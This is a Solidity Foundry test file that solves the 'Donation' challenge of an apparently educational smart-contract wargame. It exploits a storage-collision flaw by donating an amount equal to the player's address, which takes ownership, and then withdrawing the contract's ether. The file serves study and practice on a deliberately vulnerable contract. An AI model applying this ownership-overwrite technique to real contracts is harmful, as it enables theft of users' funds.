// SPDX-License-Identifier: UNLICENSED
pragma experimental ABIEncoderV2;
pragma solidity ^0.6.2;

import {Test, console} from "forge-std/Test.sol";
import {DonationChallenge} from "../../src/2-Math/5-Donation.sol";

contract DonationTest is Test {
    address challengeAddress;

    function setUp() public {
        DonationChallenge challenge = new DonationChallenge{value: 1 ether}();
        challengeAddress = payable(address(challenge));
    }

    function testSolveDonation() public {
        DonationChallenge challenge = DonationChallenge(payable(challengeAddress));

        // [START]

        address player = address(this);

        vm.startPrank(player);

        // 1. Donate
        uint256 etherAmount = uint256(uint160(player));
        uint256 scale = 10 ** 18 * 1 ether;
        uint256 etherSend = etherAmount / scale;
        challenge.donate{value: etherSend}(etherAmount);

        // 2. Withdraw
        challenge.withdraw();

        vm.stopPrank();

        // [END]

        assertTrue(challenge.isComplete());
    }

    receive() external payable {}
}
